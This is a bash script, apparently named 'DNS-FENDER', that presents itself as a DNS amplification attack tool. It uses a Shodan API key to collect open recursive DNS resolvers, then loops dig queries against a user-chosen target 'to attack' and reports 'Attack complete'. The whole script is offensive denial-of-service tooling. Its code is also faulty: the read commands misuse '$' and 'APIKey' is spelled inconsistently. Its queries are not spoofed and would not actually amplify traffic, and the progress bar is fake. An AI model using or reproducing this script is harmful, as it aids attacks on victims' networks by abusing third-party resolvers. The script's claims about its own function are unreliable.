#!/bin/bash
# Banner
RED='\033[01;31m'
banner()
{

    echo -e "${RED}DDD  N   N  SSS      FFFF EEEE N   N DDD  EEEE RRRR  
D  D NN  N S         F    E    NN  N D  D E    R   R 
D  D N N N  SSS  --- FFF  EEE  N N N D  D EEE  RRRR  
D  D N  NN     S     F    E    N  NN D  D E    R R   
DDD  N   N SSSS      F    EEEE N   N DDD  EEEE R  RR
                                                                                                            
                                                                                                            
                                                                                                            "
tput sgr0
}
banner
# Prompt for API key and Target
read -p "Enter your Shodan API key: " $APIkey
read -p "Enter the Target IP or Website (Example: www.google.com) to attack: " $Target
# Initialize
shodan init $APIKey > /dev/null 2>&1
# Search for DNS Resolvers
shodan download DNS-Resolvers "Recursion: enabled" > /dev/null 2>&1
# Parse JSON for IP addresses
shodan parse --fields ip_str DNS-Resolvers.json.gz > /dev/null 2>&1 > DNS-Resolvers.txt
rm DNS-Resolvers.json.gz
# Read from file and issue DNS amplification attack
echo -ne '#####                     (31%)\r'
sleep 4
while read line;
do 
dig $Target @$line > /dev/null 2>&1
done < DNS-Resolvers.txt
rm DNS-Resolvers.txt
echo -ne '#############             (62%)\r'
sleep 5
echo -ne '#######################   (100%)\r'
echo -ne '\n'
echo "Attack complete"
